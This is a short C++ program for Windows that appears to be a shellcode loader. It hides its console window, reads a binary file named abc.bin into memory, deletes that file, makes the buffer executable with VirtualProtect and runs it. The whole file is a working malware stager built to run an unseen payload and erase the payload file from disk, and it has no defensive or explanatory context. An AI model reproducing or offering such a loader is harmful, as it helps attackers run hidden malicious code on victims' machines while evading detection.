#include <iostream>
#include <fstream>
#include <Windows.h>

int main() {
	FreeConsole();
	std::fstream shellcode("./abc.bin", std::ios::binary | std::ios::in);
	if (shellcode.fail()) {
		return -1;
	}
	shellcode.seekg(0, std::ios::end);
	int len = shellcode.tellg();
	shellcode.seekg(0, std::ios::beg);
	char* code = new char[len];
	shellcode.read(code, len);
	shellcode.close();
	DeleteFileA("./abc.bin");
	DWORD oldProtect;
	VirtualProtect(code, len, PAGE_EXECUTE_READWRITE, &oldProtect);
	((void(WINAPI*)(int a, int b))code)(10, 12);
}